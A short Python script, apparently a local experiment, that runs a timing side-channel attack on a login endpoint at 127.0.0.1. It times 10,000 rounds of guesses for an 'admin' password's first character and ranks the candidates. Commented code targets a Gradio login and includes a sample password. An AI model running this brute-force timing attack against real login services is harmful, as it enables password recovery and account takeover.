import string
import requests
from time import time_ns,time
from pprint import pprint
import json

# Gradio server URL
# BASE_URL = "http://127.0.0.1:7860"
API_URL = "http://127.0.0.1:8000/login"
#
## Start a session (mimics a browser)
#start = time()
#session = requests.Session()
#end = time()
#print(f"session time : {end-start}\n")
## Join the queue (this is what `/queue/join` was handling internally)
#queue_url = f"{BASE_URL}/queue/status"
#
#start = time()
#response = session.get(queue_url)
#end = time()
#print(f"queue_url : {end-start}\n")
## print("Queue Response:", response.json())
#
## Send login request
#login_url = f"{BASE_URL}/api/login"
#payload = {"data": ["admin", "password1223"]}
#login_response = session.post(login_url, json=payload)
#
#print("Login Response:", login_response.json()['data'][0])
#
supposed_username = "admin"
supposed_password_length = 11

# symbols_results = {key: 0 for key in string.printable}
symbols = string.ascii_letters + string.digits
symbols_results = {key: 0 for key in symbols}

N = 10000
for_start = time()
for _ in range(N):
    for letter in symbols:
        attempt_string = letter + (supposed_password_length-1)*'_'
        start = time_ns()

        # payload = {"data": ["admin", f"{attempt_string}"]}
        # login_response = session.post(login_url, json=payload)

        login_response = requests.post(API_URL, data={"username": f"{supposed_username}", "password": f"{attempt_string}"})


        end = time_ns()
        symbols_results[letter] += end - start
for_end = time()
print(f"total for time(s) : {for_end-for_start} for N = {N}\n")

with open("results_dict.txt", "a") as file:
    sorted_data = sorted(symbols_results.items(), key=lambda x:x[1], reverse=True)
    json.dump(dict(sorted_data),file)
    file.write('\n')

pprint(sorted(symbols_results, reverse=True))
# key=symbols_results.get
# pprint(symbols_results)






# Print response
# if response.status_code == 200:
    # print("Login successful!")
    # print("Response:", response.json())
# else:
    # print("Login failed!")
    # print("Error:", response.text)